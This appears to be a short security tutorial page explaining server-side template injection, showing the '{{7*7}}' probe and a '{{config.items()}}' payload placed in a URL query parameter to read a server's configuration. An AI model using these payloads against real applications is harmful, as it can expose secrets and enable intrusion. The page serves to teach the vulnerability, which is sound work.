# Server-Side Template Injection

Also known as SSTI, occurs when in an application that uses template engines, the user input is improperly handled or validated, allowing the execution of arbitrary code or manipulation of the template syntax.

We can find a typical example of this vulnerability as follows:

* We have an app that uses a template engine to display some user's data

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
http://$url/?data=$value
```
{% endcode %}

***

* We can submit arbitrary template syntax so that the engine interprets it

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/?data={{7*7}}
```
{% endcode %}

{% hint style="info" %}
_\{{7\*7\}}_ is a standard expression that is used as a proof of concept for template injection
{% endhint %}

* This could lead to retrieving sensitive data from the server

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/?data={{config.items()}}
```
{% endcode %}
